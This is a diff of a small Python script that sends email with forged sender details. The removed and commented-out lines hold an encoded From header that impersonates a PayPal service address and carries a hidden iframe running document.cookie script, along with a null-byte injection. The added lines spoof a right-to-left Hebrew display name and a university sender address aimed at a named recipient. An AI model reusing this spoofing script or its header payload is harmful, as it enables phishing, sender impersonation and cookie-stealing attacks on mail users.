@@ -1,18 +1,24 @@
 import smtplib
 from lazyme.string import color_print
+from vals import nato_example
 
-spoofed_display_name = "Name Surname"
+spoofed_display_name = "עבריתעבריתעבריתעבריתעברית"
+# spoofed_display_name = "gowno"
 
-spoofed_from = "=?utf-8?b?c2VydmljZUBwYXlwYWwuY29tPGlmcmFtZSBvbmxvYWQ9YWxlcnQoZG9jdW1lbnQuY29va2llKSBzcmM9aHR0cHM6Ly93d3cuaHVzaG1haWwuY29tIHN0eWxlPSJkaXNwbGF5Om5vbmUi?==?utf-8?Q?=0A=00?=@mailsploit.com"
-spoofed_from = "email@gmail.com"
+# spoofed_from = "=?utf-8?b?c2VydmljZUBwYXlwYWwuY29tPGlmcmFtZSBvbmxvYWQ9YWxlcnQoZG9jdW1lbnQuY29va2llKSBzcmM9aHR0cHM6Ly93d3cuaHVzaG1haWwuY29tIHN0eWxlPSJkaXNwbGF5Om5vbmUi?==?utf-8?Q?=0A=00?=@mailsploit.com"
+spoofed_from = "aaaa@pwr.edu.pl"
 
-email_to = 'email@gmail.com'
+email_to = 'wliebert0116@gems.sw.rim.net'
 
 msg = """From: \"%s\" <%s>
 To: %s
-Subject: DOSTAJESZ AWANS\n
-JEBANY AWANS SKURWYSYNU\n\n\nSignature\n(more of the signature)
+Subject: Test RTL\n
+sdadasdasa
+
+
+Test test
 """ % (spoofed_display_name, spoofed_from, email_to)
+msg = msg.encode()
 
 SMTP_user = 'user@localhost'
 SMTP_password = 'user'
